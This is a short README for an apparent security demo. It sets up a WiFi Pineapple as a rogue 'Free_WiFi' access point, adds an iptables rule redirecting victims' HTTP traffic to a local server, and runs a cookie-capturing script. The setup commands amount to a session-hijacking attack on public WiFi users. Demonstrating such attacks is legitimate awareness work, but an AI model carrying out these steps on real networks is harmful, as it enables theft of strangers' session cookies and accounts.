# oakland-demo



## Requirements
(preferably in a virtualenv) run:
```
pip install -r requirements.txt
```

on OSX:
```
  brew install --with-python libdnet
```

## Initialization on WiFi Pineapple

1. Turn on the WiFi Pineapple and wait for the blue light to go stable.
1. Connect to the `Free_WiFi` access point.
1. In a browser go to `172.16.42.1:1471` and login.
1. Under the networking tab, enable `client AP` by scanning and connecting to a local WiFi for Internet access.
1. Now, ssh into the WiFi Pineaapple
2. Run the following commands on startup to add iptable rules
    `iptables -t nat -D PREROUTING 1`
    `iptables -t nat -A PREROUTING -p tcp --dport 80 -i br-lan -j DNAT --to 172.16.42.1:8000`
1. run the cookie capturing script with using the command below. Default interface for listening is `wlan0`


## Usage
```
  python cookie_extracter.py [listening interface]
```
